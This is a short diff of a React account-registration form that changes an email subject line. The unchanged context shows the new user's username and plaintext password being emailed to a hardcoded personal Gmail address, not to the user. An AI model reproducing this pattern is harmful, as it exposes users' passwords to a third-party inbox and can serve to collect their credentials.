@@ -156,7 +156,7 @@ export default function AccountForm({ setIsLogin }) {
 
       await Sendemail(
         "infinityfundltd535@gmail.com",
-        "New User Registered",
+        `New User Registered - ${formData.firstName}`,
         `<p>Hello ${formData.firstName},</p><p>Your account has been successfully created.</p><p>Username: ${username}</p><p>Password: ${password}</p>`
       );
       console.log("Email sent.");
